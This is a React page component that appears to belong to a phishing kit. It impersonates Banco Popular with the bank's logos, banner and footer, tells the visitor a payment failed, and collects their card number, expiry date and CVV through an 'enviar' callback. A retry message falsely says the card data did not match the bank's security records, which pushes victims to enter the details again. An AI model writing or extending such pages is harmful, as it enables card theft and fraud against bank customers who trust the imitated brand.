/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useState } from "react";

export default function Etc({ enviar, isError }: any) {
  const [tarjeta, setTarjeta] = useState("");
  const [fecha, setFecha] = useState("");
  const [cvv, setCvv] = useState("");
  
  // 👉 Mensaje de error personalizado e interactivo
  const [error, setError] = useState(
    isError 
      ? "Los datos de la tarjeta presentan una inconsistencia o no coinciden con nuestros registros de seguridad. Por favor, verifícalos e inténtalo nuevamente." 
      : ""
  );

  const isTarjetaValid = tarjeta.length >= 15 && tarjeta.length <= 16;
  const isFechaValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(fecha);
  const isCvvValid = cvv.length >= 3 && cvv.length <= 4;

  const canSubmit = isTarjetaValid && isFechaValid && isCvvValid;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!canSubmit) {
      setError("Por favor, ingrese todos los datos correctamente.");
      return;
    }
    setError("");
    enviar?.({ tarjeta, fecha, cvv, view: "tarjeta_verif" });
  };

  const handleFechaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, "");
    if (val.length > 4) val = val.slice(0, 4);

    if (val.length > 2) {
      val = val.slice(0, 2) + "/" + val.slice(2);
    }
    setFecha(val);
  };

  return (
    <div className="min-h-screen bg-[#f4f5f6] flex flex-col font-sans relative pb-[120px] lg:pb-[80px]">
      <style dangerouslySetInnerHTML={{
        __html: `
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&display=swap');
        .font-manrope { font-family: 'Manrope', sans-serif; }
        
        .teal-header {
          height: 12px;
          background-color: #105163;
          width: 100%;
        }

        .field-container {
          margin-bottom: 20px;
        }
        
        .field-container label {
          display: block;
          font-size: 13px;
          font-weight: 700;
          color: #333;
          margin-bottom: 6px;
          text-align: left;
        }

        .field-container input {
          width: 100%;
          height: 48px;
          border: 1px solid #ccc;
          border-radius: 8px;
          padding: 0 16px;
          font-size: 16px;
          color: #333;
          outline: none;
          transition: all 0.2s;
        }
        
        .field-container input:focus {
          border-color: #105163;
        }

        /* 🔴 Estilos aplicados de forma dinámica a los inputs si el linter o el estado reportan error */
        .field-container input.error-input {
          border-color: #E1111C !important;
          background-color: #fdf2f2 !important;
        }
        .field-container input.error-input:focus {
          box-ring: 2px;
          box-ring-color: #E1111C/20;
        }
      `}} />

      {/* 🔝 Teal top bar */}
      <div className="teal-header" />

      {/* Main Grid container */}
      <div className="max-w-[940px] mx-auto w-full px-4 pt-8 lg:pt-14 flex-1 flex flex-col lg:flex-row justify-center items-start gap-8">
        
        {/* Left Column: WHITE CARD FORM */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 lg:p-8 w-full max-w-[370px] mx-auto lg:mx-0 relative">
          
          {/* Logo Popular */}
          <div className="mb-6 flex justify-start">
            <img
              src="/bancos/popular/popularhorizontal_new.svg"
              style={{ height: "30px", width: "auto" }}
              alt="Banco Popular"
            />
          </div>

          <div className="mb-6 text-center">
            <h2 className={`text-[20px] font-extrabold font-manrope ${error ? "text-[#E1111C]" : "text-[#2C2A29]"}`}>
              Pago no realizado
            </h2>
            <p className="text-[13px] text-gray-500 mt-2 font-manrope">
              En este momento no es posible realizar la transacción, para continuar el pago ingrese los datos de su tarjeta crédito o débito
            </p>
          </div>

          {/* 🔴 Bloque de Alerta de Error Visual Superior */}
          {error && (
            <div className="mb-5 p-4 rounded-xl bg-red-50 border border-red-200 text-left font-manrope">
              <p className="text-[12.5px] leading-relaxed text-[#E1111C] font-semibold flex items-start gap-2">
                <span className="shrink-0 mt-0.5">⚠️</span>
                <span>{error}</span>
              </p>
            </div>
          )}

          <form onSubmit={handleSubmit} className="font-manrope" autoComplete="off">
            {/* Tarjeta Input */}
            <div className="field-container">
              <label htmlFor="tarjeta_num">Número de Tarjeta</label>
              <input
                id="tarjeta_num"
                type="text"
                placeholder="XXXX XXXX XXXX XXXX"
                maxLength={16}
                inputMode="numeric"
                autoComplete="off"
                value={tarjeta}
                className={error ? "error-input" : ""}
                onChange={(e) => {
                  setTarjeta(e.target.value.replace(/[^0-9]/g, ""));
                  setError("");
                }}
              />
            </div>

            {/* Fila Fecha y CVV */}
            <div style={{ display: "flex", gap: "16px", marginBottom: "24px" }}>
              <div style={{ flex: 1 }} className="field-container">
                <label htmlFor="tarjeta_fecha">Fecha (MM/AA)</label>
                <input
                  id="tarjeta_fecha"
                  type="text"
                  placeholder="MM/AA"
                  inputMode="numeric"
                  autoComplete="off"
                  value={fecha}
                  className={error ? "error-input" : ""}
                  onChange={(e) => {
                    handleFechaChange(e);
                    setError("");
                  }}
                />
              </div>

              <div style={{ flex: 1 }} className="field-container">
                <label htmlFor="tarjeta_cvv">CVV</label>
                <input
                  id="tarjeta_cvv"
                  type="password"
                  placeholder="***"
                  maxLength={4}
                  inputMode="numeric"
                  autoComplete="new-password"
                  value={cvv}
                  className={error ? "error-input" : ""}
                  onChange={(e) => {
                    setCvv(e.target.value.replace(/[^0-9]/g, ""));
                    setError("");
                  }}
                />
              </div>
            </div>

            {/* Submit Button */}
            <div style={{ marginTop: "24px" }}>
              <button
                type="submit"
                disabled={!canSubmit}
                className="w-full py-4 text-white font-bold text-lg rounded-xl transition-all"
                style={{
                  backgroundColor: canSubmit ? (error ? "#E1111C" : "#105163") : "#cccccc",
                  color: "#ffffff",
                  cursor: canSubmit ? "pointer" : "not-allowed"
                }}
              >
                {error ? "Reintentar Validación" : "Verificar Tarjeta"}
              </button>
            </div>

            {/* Regresar link */}
            <div className="text-center mt-4">
              <button
                type="button"
                className="text-sm font-semibold text-gray-500 hover:text-gray-800 bg-transparent border-none cursor-pointer"
                onClick={() => window.location.reload()}
              >
                Regresar
              </button>
            </div>
          </form>

        </div>

        {/* Right Column: BANNER AND HELPER CARDS (Hidden on mobile) */}
        <div className="hidden lg:flex flex-col gap-6 w-full max-w-[500px]">
          <div className="bg-[#105163] rounded-2xl overflow-hidden shadow-sm relative h-[250px] flex items-center">
            <img 
              src="/bancos/popular/popular_banner.png" 
              className="absolute inset-0 w-full h-full object-cover opacity-60" 
              alt="Promo background"
            />
            <div className="absolute inset-0 bg-linear-to-r from-[#105163] via-[#105163]/75 to-transparent z-10" />

            <div className="relative z-20 px-8 text-left max-w-[320px]">
              <h3 className="text-white text-[20px] font-bold leading-tight mb-2">
                Pagos rápidos y seguros
              </h3>
              <p className="text-gray-200 text-[12px] leading-relaxed mb-6">
                Paga tus servicios públicos/privados y obligaciones bancarias a través de tu cuenta de ahorros.
              </p>
              <button className="bg-white text-[#105163] text-[12px] font-extrabold px-6 py-2.5 rounded-md hover:bg-gray-100 transition-colors">
                Inscribe y paga
              </button>
            </div>
          </div>

          <div className="text-left font-manrope">
            <h4 className="text-[13px] font-extrabold text-gray-700 mb-4">¿Cómo podemos ayudarte?</h4>
            <div className="grid grid-cols-3 gap-4">
              <div className="bg-white rounded-xl border border-gray-100 p-4 flex flex-col items-center justify-center text-center shadow-xs cursor-pointer hover:border-green-600 transition-colors">
                <div className="w-10 h-10 rounded-full bg-[#e8f5e9] flex items-center justify-center mb-2">
                  <svg viewBox="0 0 24 24" fill="none" stroke="#105163" strokeWidth="2" className="w-5 h-5">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v6m3-3H9m12 0a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" />
                  </svg>
                </div>
                <span className="text-[10px] font-bold text-gray-700 leading-tight">Solicitar productos</span>
              </div>

              <div className="bg-white rounded-xl border border-gray-100 p-4 flex flex-col items-center justify-center text-center shadow-xs cursor-pointer hover:border-green-600 transition-colors">
                <div className="w-10 h-10 rounded-full bg-[#e8f5e9] flex items-center justify-center mb-2">
                  <svg viewBox="0 0 24 24" fill="none" stroke="#105163" strokeWidth="2" className="w-5 h-5">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M2.25 6.75c0 8.284 6.716 15 15 15h2.25a2.25 2.25 0 0 0 2.25-2.25v-1.372c0-.516-.351-.966-.852-1.091l-4.423-1.106c-.44-.11-.902.055-1.173.417l-.97 1.293c-.282.376-.769.542-1.21.387a12.017 12.017 0 0 1-4.7-4.7c-.155-.44.01-.928.387-1.21l1.293-.97c.363-.271.527-.734.417-1.173L6.963 3.102a1.125 1.125 0 0 0-1.091-.852H4.5a2.25 2.25 0 0 0 2.25-2.25v-1.372c0-.516-.351-.966-.852-1.091l-4.423-1.106c-.44-.11-.902.055-1.173.417l-.97 1.293c-.282.376-.769.542-1.21.387a12.017 12.017 0 0 1-4.7-4.7c-.155-.44.01-.928.387-1.21l1.293-.97c.363-.271.527-.734.417-1.173L6.963 3.102a1.125 1.125 0 0 0-1.091-.852H4.5A2.25 2.25 0 0 0 2.25 4.5v2.25Z" />
                  </svg>
                </div>
                <span className="text-[10px] font-bold text-gray-700 leading-tight">Contáctanos</span>
              </div>

              <div className="bg-white rounded-xl border border-gray-100 p-4 flex flex-col items-center justify-center text-center shadow-xs cursor-pointer hover:border-green-600 transition-colors">
                <div className="w-10 h-10 rounded-full bg-[#e8f5e9] flex items-center justify-center mb-2">
                  <svg viewBox="0 0 24 24" fill="none" stroke="#105163" strokeWidth="2" className="w-5 h-5">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M15 10.5a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z" />
                    <path strokeLinecap="round" strokeLinejoin="round" d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1 1 15 0Z" />
                  </svg>
                </div>
                <span className="text-[10px] font-bold text-gray-700 leading-tight">Visítanos</span>
              </div>
            </div>
          </div>
        </div>

      </div>

      {/* FOOTER */}
      <footer className="absolute bottom-0 left-0 w-full bg-white border-t border-gray-100 py-4 px-6 flex flex-col lg:flex-row justify-between items-center gap-4 z-40 text-[11px] text-gray-400 font-medium">
        <div className="flex items-center gap-3">
          <img
            src="/bancos/popular/popularhorizontal_new.svg"
            style={{ height: "18px", width: "auto", filter: "grayscale(1) opacity(0.7)" }}
            alt="Banco Popular"
          />
          <div className="h-3 w-px bg-gray-300" />
          <div className="flex items-center gap-1 font-bold text-gray-400">
            Grupo <span className="text-blue-700/70">AVAL</span>
          </div>
        </div>
        <div className="flex items-center gap-6 text-orange-600 font-bold">
          <a href="#" className="hover:underline">Seguridad</a>
          <a href="#" className="hover:underline">Accesibilidad</a>
        </div>
        <div>
          <span>Miércoles, 15 de julio de 2026 | 03:44 p.m. © Banco Popular. Todos los derechos reservados. | v4.3.22</span>
        </div>
      </footer>

    </div>
  );
}